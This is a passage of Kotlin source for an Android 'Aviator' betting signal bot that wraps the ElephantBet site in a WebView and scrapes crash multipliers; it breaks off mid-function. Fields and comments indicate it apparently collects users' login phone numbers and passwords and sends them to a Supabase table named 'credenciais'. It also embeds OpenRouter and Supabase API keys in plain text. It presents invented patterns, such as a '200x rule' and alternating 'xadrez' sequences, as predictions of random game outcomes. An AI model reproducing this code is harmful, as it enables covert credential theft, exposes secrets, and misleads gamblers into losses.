package ao.elephantbet.aviatorbot

import android.annotation.SuppressLint
import android.app.AlertDialog
import android.app.DownloadManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.media.AudioAttributes
import android.media.SoundPool
import android.net.Uri
import android.net.http.SslError
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.animation.AlphaAnimation
import android.view.animation.Animation
import android.view.ViewGroup.LayoutParams.MATCH_PARENT as MATCH
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT as WRAP
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Calendar

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var barLayout: LinearLayout
    private lateinit var txtMinutos: TextView
    private lateinit var txtAcao: TextView
    private lateinit var txtProtecao: TextView
    private lateinit var txtAlcance: TextView
    private lateinit var dotView: View
    private lateinit var txtJanela: TextView  // linha ⏱ Entrar: min XX → XX
    private lateinit var txtAviso: TextView   // banner de aviso/alerta sempre visível
    private lateinit var txtRelogio: TextView // relógio fixo sempre visível (HH:MM)
    private var pulseRunnable: Runnable? = null

    private val handler = Handler(Looper.getMainLooper())
    private var relogioRunnable: Runnable? = null

    // Estado dos sinais
    private var sinaisAtivos = false
    private var horaAtual = -1
    private var ultimoMinutoGerado = -1
    private var sinalMin1 = -1
    private var sinalMin2 = -1
    private var sinalProtecao = ""
    private var sinalAlcMin = 0
    private var sinalAlcMax = ""
    private var sinalTendencia = ""
    private var sinalConfianca = 0
    private var sinalMinEntrada = -1   // minuto escolhido pela IA para entrar (ex: 17)
    private var sinalMinSaida  = -1   // fim da janela: sinalMinEntrada + 1 (calculado ao receber sinal)

    // Regras avançadas de estado
    private var houveMega200xRecente = false       // se saiu vela 200x+ → próximas 3-4 rosas uma será ≥70x
    private var rosasMega200xRestantes = 0         // contador regressivo de rosas após 200x
    private var ultimaRosaGrande = 0.0             // última rosa ≥10x vista
    private var rosasDesde200x = 0                 // rosas contadas após um 200x
    private var xadrezAlcanceActivo = false        // padrão xadrez de alcance detectado
    private var xadrezAlcanceAlto = true           // próxima rosa no xadrez de alcance é alta (≥20x)?
    private var ultimaRosaAlta = false             // última rosa foi ≥20x (para xadrez de alcance)
    private var rosasXadrezAlcance = mutableListOf<Double>() // últimas rosas para detectar xadrez
    private var semRosaGrandeUlt10min = false      // sem rosa ≥50x nos últimos 10 min da hora
    private var timestampUltimaRosa50x = 0L        // timestamp da última rosa ≥50x

    // Histórico real das velas capturadas dentro do jogo
    private val historicoVelas = mutableListOf<Double>()
    private var analisandoIA = false
    private var dentroDoAviator = false
    private var graficoPronto = false           // true só após 1.º crash ao vivo
    private var historicoJogoCarregado = false  // true quando JS enviou o histórico do gráfico
    private var countdown429Job: Runnable? = null
    private var iaTimeoutRunnable: Runnable? = null  // timeout de 50s da chamada à IA
    private var ultimaAnaliseMs = 0L          // timestamp da última análise
    private val COOLDOWN_IA_MS = 15_000L
    private var velasDesdeUltimaAnalise = 0

    // ── CICLO BASEADO NA JANELA ──────────────────────────────────
    // Após recolher 15 velas → 1.ª análise imediata
    // Sinal fica visível até o minuto sinalMinSaida terminar
    // Quando sinalMinSaida passa → pausa 30s → nova análise
    // Nunca por tempo fixo — sempre sincronizado com o relógio
    private var proximaAnaliseRunnable: Runnable? = null   // runnable agendado
    private var cicloAtivo = false                         // true quando aguarda fim da janela
    private var janelaJaDisparou = false                   // evita disparar 2x no mesmo minuto
    private var countdownCicloJob: Runnable? = null        // countdown visual em tempo real

    // Controlo do round actual (para capturar só o crash final)
    private var xAtual = 0.0
    private var emVoo = false
    private var ultimoCrash = 0.0
    private var ultimoCrashMs = 0L   // timestamp do último crash (evita duplicados por tempo)
    private var ultimoTickMs = 0L

    // Runnable nomeado para cancelar correctamente o timeout de crash
    private val crashTimeoutRunnable = Runnable {
        if (emVoo && xAtual >= 1.0) registarCrash(xAtual)
    }

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 1 — MODO SILENCIOSO DURANTE O VOO
    // Quando o multiplicador está a subir, nada deve ser feito.
    // ══════════════════════════════════════════════════════════════
    private var modoSilenciosoAtivo = false  // true enquanto o avião está em voo

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 2 — DETECÇÃO DE PADRÃO DE MINUTOS REPETIDOS
    // Conta quantas rosas ≥10x caíram em cada minuto do relógio.
    // ══════════════════════════════════════════════════════════════
    private val contagemMinutos = IntArray(60) { 0 }  // minuto → contagem de rosas grandes

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 3 — CACHE DO PROMPT DA IA
    // Evita chamar a IA se entraram <3 velas novas desde a última análise.
    // ══════════════════════════════════════════════════════════════
    private var cacheResultadoIA: String? = null
    private var cacheNumVelas: Int = 0
    private var cacheTimestampMs: Long = 0L
    private val CACHE_MIN_VELAS_NOVAS = 3
    private val CACHE_MAX_IDADE_MS = 60_000L  // 60 segundos

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 4 — NOTIFICAÇÃO SONORA + VIBRAÇÃO NO SINAL
    // ══════════════════════════════════════════════════════════════
    private var soundPool: SoundPool? = null
    private var soundIdSinal: Int = 0
    private var soundCarregado = false

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 5 — MODO CONSERVADOR AUTOMÁTICO
    // Se >60% das últimas 10 velas forem azuis (<2x) → modo conservador.
    // ══════════════════════════════════════════════════════════════
    private var modoConservadorAtivo = false
    private val JANELA_CONSERVADOR = 10
    private val LIMIAR_AZUIS_CONSERVADOR = 0.60f

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 6 — HISTÓRICO DE SINAIS COM COMPARAÇÃO REAL
    // Guarda os últimos 10 sinais e compara com crashes reais.
    // ══════════════════════════════════════════════════════════════
    private val historicoSinais = mutableListOf<SinalRegistado>()
    private var sinalPendenteComparacao: SinalRegistado? = null

    data class SinalRegistado(
        val timestampMs: Long,
        val protecao: Double,
        val alcanceMin: Int,
        val alcanceMax: Int,
        val confianca: Int,
        var crashReal: Double? = null,
        var protecaoOk: Boolean? = null,
        var alcanceOk: Boolean? = null
    ) {
        val emoji: String get() = when {
            crashReal == null -> "⏳"
            alcanceOk == true -> "✅"
            protecaoOk == true -> "🟡"
            else -> "❌"
        }
    }

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 8 — MODO OFFLINE / SEM IA
    // Quando IA falha, usa regras locais para gerar sinal básico.
    // ══════════════════════════════════════════════════════════════
    private var consecutivosFalhosIA = 0
    private val MAX_FALHOS_ANTES_OFFLINE = 2
    // Retry automático: após entrar em offline, tentar a IA de novo com backoff
    private var retryIaJob: Runnable? = null
    private var retryIaIntervalMs = 60_000L   // começa em 60s, duplica até 5 min

    // ══════════════════════════════════════════════════════════════
    // MELHORIA 9 — REINÍCIO AUTOMÁTICO APÓS CRASH DO APP
    // Guarda e restaura o último sinal activo em SharedPreferences.
    // ══════════════════════════════════════════════════════════════
    private val PREFS_ESTADO = "skybot_estado"
    private val PREFS_SINAL_JSON = "ultimo_sinal_json"
    private val PREFS_CONSERVADOR = "modo_conservador"
    private val PREFS_VELAS_COUNT = "num_velas"

    // Configuração do histórico
    private val MIN_VELAS_ANALISE = 8     // mínimo para pedir sinal à IA (histórico DOM garante arranque rápido)
    private val MAX_VELAS_LOCAL = 30      // máximo em memória local
    private val MAX_VELAS_SUPABASE = 100  // limite máximo no Supabase
    private val VELAS_A_APAGAR = 50       // apagar as 50 mais antigas ao atingir o limite
    private var totalVelasSupabase = 0    // contador estimado (actualizado ao carregar)
    private var limpezaEmCurso = false    // evitar limpezas simultâneas

    private fun registarCrash(crashVal: Double) {
        if (!emVoo) return
        emVoo = false
        modoSilenciosoAtivo = false  // M1: fim do voo, reactivar bot

        // CORRECÇÃO CRÍTICA: usar o maior entre crashVal (DOM/WS texto) e xAtual (WS binário)
        val valorFinal = if (crashVal >= xAtual && crashVal >= 1.0) crashVal else xAtual
        xAtual = 0.0
        handler.removeCallbacks(crashTimeoutRunnable)

        // Evitar duplicados e valores inválidos (mínimo 3s entre crashes)
        val agora = System.currentTimeMillis()
        if (valorFinal < 1.0 || (valorFinal == ultimoCrash && agora - ultimoCrashMs < 3000)) return
        ultimoCrash = valorFinal
        ultimoCrashMs = agora

        // Guardar no histórico local (máx 30)
        historicoVelas.add(valorFinal)
        if (historicoVelas.size > MAX_VELAS_LOCAL) historicoVelas.removeAt(0)

        // ── M2: REGISTO DE PADRÃO DE MINUTOS ──────────────────────────────
        if (valorFinal >= 10.0) {
            val minCrash = Calendar.getInstance().get(Calendar.MINUTE)
            contagemMinutos[minCrash]++
        }

        // ── M5: AVALIAR MODO CONSERVADOR AUTOMÁTICO ────────────────────────
        avaliarModoConservador()

        // ── M6: COMPARAR SINAL PENDENTE COM CRASH REAL ────────────────────
        sinalPendenteComparacao?.let { sinal ->
            if (sinal.crashReal == null) {
                sinal.crashReal = valorFinal
                sinal.protecaoOk = valorFinal >= sinal.protecao
                sinal.alcanceOk = valorFinal >= sinal.alcanceMin
                // Actualizar estatísticas de sinais na UI
                handler.post { actualizarEstatisticasSinais() }
            }
            sinalPendenteComparacao = null
        }

        // ── M9: LIMPAR SINAL GUARDADO (crash terminou, sinal já não é válido) ──
        getSharedPreferences(PREFS_ESTADO, Context.MODE_PRIVATE)
            .edit().remove(PREFS_SINAL_JSON).apply()

        // ── M3: INVALIDAR CACHE DA IA (novo crash = nova análise necessária) ──
        cacheResultadoIA = null
        // ── REGRA 200x+: se saiu uma vela ≥200x, nas próximas 3-4 rosas uma será ≥70x ──
        if (valorFinal >= 200.0) {
            houveMega200xRecente = true
            rosasMega200xRestantes = 4
            rosasDesde200x = 0
        }
        // Contagem de rosas após 200x
        if (houveMega200xRecente && valorFinal >= 10.0) {
            rosasDesde200x++
            if (valorFinal >= 70.0 || rosasDesde200x >= 4) {
                houveMega200xRecente = false
                rosasMega200xRestantes = 0
            } else {
                rosasMega200xRestantes = 4 - rosasDesde200x
            }
        }

        // ── REGRA XADREZ DE ALCANCE: rosas alternando ≥20x / <20x ──
        if (valorFinal >= 10.0) {
            ultimaRosaGrande = valorFinal
            rosasXadrezAlcance.add(valorFinal)
            if (rosasXadrezAlcance.size > 6) rosasXadrezAlcance.removeAt(0)
            // Detectar padrão alternado: ≥20x, <20x, ≥20x, <20x
            if (rosasXadrezAlcance.size >= 4) {
                val ultimas4 = rosasXadrezAlcance.takeLast(4)
                val alt1 = ultimas4[0] >= 20.0 && ultimas4[1] < 20.0 && ultimas4[2] >= 20.0 && ultimas4[3] < 20.0
                val alt2 = ultimas4[0] < 20.0 && ultimas4[1] >= 20.0 && ultimas4[2] < 20.0 && ultimas4[3] >= 20.0
                xadrezAlcanceActivo = alt1 || alt2
                if (xadrezAlcanceActivo) {
                    xadrezAlcanceAlto = ultimas4.last() < 20.0
                    // Mostrar histórico das últimas rosas com emoji de cor
                    val emojisXadrez = rosasXadrezAlcance.joinToString(" ") { v ->
                        when {
                            v >= 50.0 -> "🟣"   // mega
                            v >= 20.0 -> "🩷"   // rosa grande
                            else      -> "🔵"   // rosa pequena
                        }
                    }
                    runOnUiThread { /* xadrez detectado */ }
                }
            }
            // Rastrear rosa ≥50x para regra dos últimos 10 min da hora
            if (valorFinal >= 50.0) {
                timestampUltimaRosa50x = System.currentTimeMillis()
                semRosaGrandeUlt10min = false
            }
        }

        // ── REGRA ÚLTIMOS 10 MIN DA HORA ──
        val calAgora = Calendar.getInstance()
        val minutoAgora = calAgora.get(Calendar.MINUTE)
        if (minutoAgora >= 50) {
            val minDesdeUltimaRosa50 = if (timestampUltimaRosa50x > 0L)
                (System.currentTimeMillis() - timestampUltimaRosa50x) / 60000 else 999L
            semRosaGrandeUlt10min = minDesdeUltimaRosa50 >= 10
        } else if (minutoAgora < 5) {
            semRosaGrandeUlt10min = false
        }

        // Guardar no Supabase (só o crash final, nunca ticks)
        totalVelasSupabase++
        enviarVelaSupabase(valorFinal)

        // Quando atinge 100 velas, apagar as 50 mais antigas (uma única limpeza de cada vez)
        if (totalVelasSupabase >= MAX_VELAS_SUPABASE && !limpezaEmCurso) {
            limpezaEmCurso = true
            limparVelasAntigas()
        }

        val n = historicoVelas.size

        // Cor da vela para o display
        val corCrash = when {
            valorFinal >= 50.0 -> "#f0abfc"  // mega (lilás brilhante)
            valorFinal >= 10.0 -> "#ec4899"  // rosa
            valorFinal >= 2.0  -> "#a855f7"  // roxa
            else               -> "#3b82f6"  // azul
        }

        // ═════════════════════════════════════════════════════════════════════════
        // ✅ RESTAURAR VISIBILIDADE E ANIMAÇÕES APÓS O VOO
        // ═════════════════════════════════════════════════════════════════════════
        runOnUiThread {
            // 1 — Restaurar relógio
            txtRelogio.visibility = View.VISIBLE
            txtRelogio.alpha = 1f
            txtRelogio.clearAnimation()
            
            // 2 — Limpar multiplicador
            txtMinutos.text = ""
            txtMinutos.visibility = View.GONE
            txtMinutos.alpha = 1f
            txtMinutos.clearAnimation()
            
            // 3 — Restaurar tendência (txtAcao)
            txtAcao.visibility = View.VISIBLE
            txtAcao.alpha = 1f
            txtAcao.clearAnimation()
            txtAcao.animate().cancel()
            
            // 4 — Restaurar protecção com animação suave
            if (::txtProtecao.isInitialized) {
                txtProtecao.alpha = 1f
                txtProtecao.clearAnimation()
                txtProtecao.animate().cancel()
                txtProtecao.animate()
                    .alpha(1f).setDuration(300).start()
            }
            
            // 5 — Restaurar alcance com animação suave de scale
            if (::txtAlcance.isInitialized) {
                txtAlcance.alpha = 1f
                txtAlcance.clearAnimation()
                txtAlcance.animate().cancel()
                txtAlcance.animate()
                    .scaleX(1.08f).scaleY(1.08f).setDuration(180)
                    .withEndAction {
                        txtAlcance.animate()
                            .scaleX(1f).scaleY(1f).setDuration(180).start()
                    }.start()
            }
            
            // 6 — Restaurar janela
            if (::txtJanela.isInitialized) {
                txtJanela.alpha = 1f
                txtJanela.clearAnimation()
                txtJanela.animate().cancel()
            }
        }

        // Se já há sinal activo, restaurar o sinal em vez de mostrar "CRASH x.xx"
        if (sinaisAtivos && sinalProtecao.isNotEmpty()) {
            val cal2 = Calendar.getInstance()
            val minAgora2 = cal2.get(Calendar.MINUTE)
            mostrarSinalCompleto(sinalProtecao, "${sinalAlcMin}x → $sinalAlcMax", sinalTendencia, sinalConfianca,
                when {
                    (sinalAlcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0) >= 100 -> "#ec4899"
                    (sinalAlcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0) >= 20  -> "#22c55e"
                    (sinalAlcMax.replace(Regex("[^0-9]"), "").toIntOrNull() ?: 0) >= 5   -> "#f59e0b"
                    else -> "#3b82f6"
                }, minAgora2)
        } else {
            setBarra("CRASH ${String.format("%.2f", valorFinal)}x",
                if (n < MIN_VELAS_ANALISE) "$n/${MIN_VELAS_ANALISE} velas recolhidas"
                else "$n velas capturadas",
                corCrash)
        }

        velasDesdeUltimaAnalise++

        // Actualizar banner de avisos/alertas após cada vela
        atualizarAviso()

        // ── FASE 1: RECOLHA ──────────────────────────────────────────
        // Enquanto não tiver 15 velas, só mostra progresso. NUNCA chama a IA.
        if (n < MIN_VELAS_ANALISE) {
            handler.postDelayed({
                setBarra("⏳ A RECOLHER DADOS",
                    "$n/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
            }, 800)
            return
        }

        // ── FASE 2: 1.ª ANÁLISE — só aqui a análise começa (1.º crash após ter velas suficientes) ──
        if (!graficoPronto) {
            graficoPronto = true
            contarVelasSupabase()  // gestão do limite Supabase em background
            if (!analisandoIA && !cicloAtivo) {
                setBarra("🔍 IA A ANALISAR...", "${historicoVelas.size} velas prontas", "#7c3aed")
                // Aguardar 4s para garantir que o voo seguinte não começou ainda
                // e que modoSilenciosoAtivo está false
                handler.postDelayed({
                    modoSilenciosoAtivo = false  // forçar desactivação para análise inicial
                    invalidarCache()             // forçar chamada real à IA
                    pedirSinalIA()
                }, 4_000)
            }
            return
        }

        // ── FASE 3: CICLO EM CURSO ───────────────────────────────────
        // O countdown de 60s está a correr e dispara sozinho. Nada a fazer aqui.
    }

    // ── GESTÃO DE BANCA ───────────────────────────────────────────
    private var bancaInicial = 0.0
    private var bancaAtual   = 0.0
    private var apostaPorRonda = 0.0
    private val MAX_RISCO_PORCENTO = 2.0

    // ── TRACKING DE RESULTADOS ────────────────────────────────────
    private var totalApostas  = 0
    private var totalGanhos   = 0
    private var totalPerdas   = 0
    private var lucroLiquido  = 0.0
    private var sequenciaPerdas = 0
    private var maxSequenciaPerdas = 0
    private var timestampInicioSessao = 0L
    private var stopLossAtivo = false
    private var takeProfitAtivo = false
    private val STOP_LOSS_PORCENTO  = 20.0
    private val TAKE_PROFIT_PORCENTO = 30.0
    private val PREFS = "skybot_prefs"

    // Credenciais
    private var ultimoNumeroEnviado = ""
    private var ultimaSenhaEnviada = ""
    private var numeroTemporario = ""   // guarda número até ter senha para enviar junto
    private var sessaoId: Int = -1      // id da linha inserida no Supabase para esta sessão
    private var credPollerAtivo = false  // impede múltiplos pollers em paralelo
    private var credEnviadas = false     // impede envios duplicados entre sessões

    private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
    private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
    private val TABELA = "credenciais"
    private val VERSAO_ATUAL = "9.0"

    // OpenRouter — provedor de IA (chave 1 principal, chave 2 fallback)
    private val OR_KEY   = "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"
    private val OR_KEY2  = "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"
    private val OR_URL   = "https://openrouter.ai/api/v1/chat/completions"
    private val OR_MODEL = "meta-llama/llama-3-70b-instruct"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        construirUI()
        carregarPrefs()
        timestampInicioSessao = System.currentTimeMillis()

        // M4 — Inicializar SoundPool para alertas sonoros
        inicializarSom()

        // M9 — Restaurar estado após kill do processo
        restaurarEstado()

        webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
        handler.postDelayed({ verificarAtualizacao() }, 3000)

        // Mostrar tutorial sempre ao abrir o app
        handler.postDelayed({ mostrarTutorial() }, 800)
    }

    // ── UI ────────────────────────────────────────────────────────
    private fun construirUI() {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0a0a0f"))
            layoutParams = ViewGroup.LayoutParams(MATCH, MATCH)
        }
        setContentView(root)

        // ══════════════════════════════════════════════════════════
        // BARRA PRINCIPAL — design profissional
        // ══════════════════════════════════════════════════════════
        barLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0a0f1e"))
            setPadding(dp(14), dp(10), dp(14), dp(12))
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }

        // ── Linha topo: RelativeLayout para posições fixas sem sobreposição ──
        // Hora fixada no canto esquerdo | Tendência centrada | Engrenagem no canto direito
        val linhaTop = android.widget.RelativeLayout(this).apply {
            layoutParams = LinearLayout.LayoutParams(MATCH, dp(36))
        }
        // Relógio — canto superior esquerdo, SEMPRE visível
        txtRelogio = TextView(this).apply {
            id = android.view.View.generateViewId()
            text = "--:--"; textSize = 13f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#94a3b8")); isSingleLine = true
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = android.widget.RelativeLayout.LayoutParams(WRAP, MATCH).apply {
                addRule(android.widget.RelativeLayout.ALIGN_PARENT_START)
                addRule(android.widget.RelativeLayout.CENTER_VERTICAL)
                marginStart = dp(2)
            }
        }
        // Multiplicador em voo — SUBSTITUI o relógio (mesmo espaço, sem sobreposição)
        txtMinutos = TextView(this).apply {
            id = android.view.View.generateViewId()
            text = ""; textSize = 14f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#f59e0b")); isSingleLine = true
            gravity = Gravity.CENTER_VERTICAL or Gravity.CENTER_HORIZONTAL
            layoutParams = android.widget.RelativeLayout.LayoutParams(dp(70), MATCH).apply {
                addRule(android.widget.RelativeLayout.ALIGN_PARENT_START)
                addRule(android.widget.RelativeLayout.CENTER_VERTICAL)
                marginStart = dp(2)
            }
        }
        // Tendência + confiança — centrado horizontalmente
        txtAcao = TextView(this).apply {
            id = android.view.View.generateViewId()
            text = ""; textSize = 12f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#64748b")); letterSpacing = 0.04f
            gravity = Gravity.CENTER; isSingleLine = true
            layoutParams = android.widget.RelativeLayout.LayoutParams(WRAP, MATCH).apply {
                addRule(android.widget.RelativeLayout.CENTER_IN_PARENT)
            }
        }
        // Dot pulsante — à esquerda do ⚙️
        dotView = View(this).apply {
            id = android.view.View.generateViewId()
            layoutParams = android.widget.RelativeLayout.LayoutParams(dp(9), dp(9)).apply {
                addRule(android.widget.RelativeLayout.ALIGN_PARENT_END)
                addRule(android.widget.RelativeLayout.CENTER_VERTICAL)
                marginEnd = dp(36)
            }
            background = circulo("#334155")
        }
        // Engrenagem — fixada no canto superior direito, nunca se move
        val cfgBtn = TextView(this).apply {
            id = android.view.View.generateViewId()
            text = "⚙️"; textSize = 19f; gravity = Gravity.CENTER
            layoutParams = android.widget.RelativeLayout.LayoutParams(dp(32), MATCH).apply {
                addRule(android.widget.RelativeLayout.ALIGN_PARENT_END)
                addRule(android.widget.RelativeLayout.CENTER_VERTICAL)
            }
            setOnClickListener { mostrarConfig() }
        }
        linhaTop.addView(txtRelogio)
        linhaTop.addView(txtMinutos)
        linhaTop.addView(txtAcao)
        linhaTop.addView(dotView)
        linhaTop.addView(cfgBtn)

        // ── Divisor fino ──────────────────────────────────────────
        val divisor = View(this).apply {
            setBackgroundColor(Color.parseColor("#1e293b"))
            layoutParams = LinearLayout.LayoutParams(MATCH, dp(1)).apply { topMargin = dp(8) }
        }

        // ── Linha meio: 🛡 SAÍDA  ›  🎯 ALCANCE ─────────────────
        // Labels pequenos por cima
        val linhaLabels = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(10) }
        }
        val lblProt = TextView(this).apply {
            text = "SAÍDA SEGURA"; textSize = 9f; letterSpacing = 0.10f
            setTextColor(Color.parseColor("#475569")); gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        val lblAlc = TextView(this).apply {
            text = "OBJECTIVO"; textSize = 9f; letterSpacing = 0.10f
            setTextColor(Color.parseColor("#475569")); gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        linhaLabels.addView(lblProt); linhaLabels.addView(lblAlc)

        // Valores grandes
        val linhaMeio = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(4) }
        }
        txtProtecao = TextView(this).apply {
            text = "--"; textSize = 26f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#94a3b8")); gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        val sep = TextView(this).apply {
            text = "›"; textSize = 20f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#334155")); gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply {
                marginStart = dp(8); marginEnd = dp(8)
            }
        }
        txtAlcance = TextView(this).apply {
            text = "--"; textSize = 20f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#94a3b8")); gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        linhaMeio.addView(txtProtecao); linhaMeio.addView(sep); linhaMeio.addView(txtAlcance)

        // ── Linha janela: ⏱ Entrar: min XX → XX ─────────────────
        txtJanela = TextView(this).apply {
            text = ""; textSize = 13f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#38bdf8")); gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, dp(2))
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
            visibility = View.GONE
        }

        // ── Banner de aviso/alerta (comboio, pós-mega, xadrez, fim hora) ──
        txtAviso = TextView(this).apply {
            text = ""; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            setPadding(dp(10), dp(5), dp(10), dp(5))
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(4) }
            visibility = View.GONE
        }

        barLayout.addView(linhaTop)
        barLayout.addView(divisor)
        barLayout.addView(linhaLabels)
        barLayout.addView(linhaMeio)
        barLayout.addView(txtJanela)
        barLayout.addView(txtAviso)
        root.addView(barLayout)

        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(MATCH, 0, 1f)
        }
        configurarWebView()
        root.addView(webView)
    }

    // ── WEBVIEW ───────────────────────────────────────────────────
    @SuppressLint("SetJavaScriptEnabled")
    private fun configurarWebView() {
        webView.settings.apply {
            javaScriptEnabled = true; domStorageEnabled = true
            databaseEnabled = true; allowFileAccess = true
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            setSupportZoom(true); builtInZoomControls = false
            loadWithOverviewMode = true; useWideViewPort = true
        }

        webView.addJavascriptInterface(object {

            @JavascriptInterface
            fun aviatorAberto() = runOnUiThread {
                if (!dentroDoAviator) {
                    dentroDoAviator = true
                    graficoPronto = false
                    historicoJogoCarregado = false
                    historicoVelas.clear()
                    sinaisAtivos = false
                    sinalProtecao = ""
                    sinalMinEntrada = -1
                    sinalMinSaida   = -1
                    cicloAtivo = false
                    janelaJaDisparou = false
                    proximaAnaliseRunnable?.let { handler.removeCallbacks(it) }
                    countdownCicloJob?.let { handler.removeCallbacks(it) }; countdownCicloJob = null
                    emVoo = false; xAtual = 0.0; ultimoCrash = 0.0; analisandoIA = false
                    // Iniciar relógio imediatamente para mostrar hora desde o início
                    if (relogioRunnable == null) iniciarRelogio()
                    setBarra("⏳ AGUARDAR CRASH", "Aviator aberto · aguardar 1.º crash...", "#475569")
                    // Tentar ler histórico DOM em background (dados para análise futura)
                    // mas NUNCA disparar pedirSinalIA() a partir daqui
                    handler.postDelayed({
                        if (!historicoJogoCarregado && dentroDoAviator) {
                            // DOM não respondeu — ok, aguardar crashes ao vivo
                            setBarra("⏳ AGUARDAR CRASH", "A recolher velas ao vivo...", "#475569")
                        }
                    }, 12_000)
                }
            }

            @JavascriptInterface
            fun velaCapturada(valor: String) {
                val num = valor.toDoubleOrNull() ?: return
                if (num < 1.0 || num > 200000.0) return
                val agora = System.currentTimeMillis()
                runOnUiThread {
                    handler.removeCallbacks(crashTimeoutRunnable)

                    if (!emVoo) {
                        emVoo = true
                        xAtual = num
                        ultimoTickMs = agora
                        modoSilenciosoAtivo = true  // M1: silêncio durante o voo
                        mostrarEmVoo(num)
                    } else {
                        if (num >= xAtual) {
                            xAtual = num
                            ultimoTickMs = agora
                            mostrarEmVoo(num)
                        }
                    }

                    val timeoutMs = when {
                        xAtual >= 100.0 -> 60000L
                        xAtual >= 20.0  -> 40000L
                        xAtual >= 5.0   -> 20000L
                        else            -> 10000L
                    }
                    handler.postDelayed(crashTimeoutRunnable, timeoutMs)
                }
            }

            @JavascriptInterface
            fun crashDetectado(valor: String) {
                val num = valor.toDoubleOrNull() ?: return
                if (num < 1.0 || num > 200000.0) return
                runOnUiThread {
                    handler.removeCallbacks(crashTimeoutRunnable)
                    if (!emVoo) emVoo = true
                    registarCrash(num)
                }
            }

            // Histórico do DOM recebido — carregar imediatamente para análise rápida
            @JavascriptInterface
            fun velasHistoricoRecebidas(json: String) = runOnUiThread {
                if (!dentroDoAviator) return@runOnUiThread
                if (historicoJogoCarregado) return@runOnUiThread  // já carregado, ignorar duplicados

                // Extrair números do JSON simples: [1.23,4.56,...]
                val valores = Regex("""[\d]+\.[\d]+""").findAll(json)
                    .mapNotNull { it.value.toDoubleOrNull() }
                    .filter { it >= 1.0 && it <= 200000.0 }
                    .toList()

                if (valores.isEmpty()) {
                    setBarra("⏳ AGUARDAR CRASH", "DOM vazio — a recolher ao vivo...", "#475569")
                    return@runOnUiThread
                }

                // Carregar no histórico local sem duplicar velas já registadas
                val novas = valores.filter { v -> historicoVelas.none { it == v } }
                // Inserir no início (são mais antigas) + manter as ao vivo no fim
                val combinado = (novas + historicoVelas).takeLast(MAX_VELAS_LOCAL)
                historicoVelas.clear()
                historicoVelas.addAll(combinado)
                historicoJogoCarregado = true

                val n = historicoVelas.size
                // Histórico DOM carregado — aguardar 1.º crash ao vivo para iniciar análise
                // graficoPronto só muda em registarCrash (FASE 2)
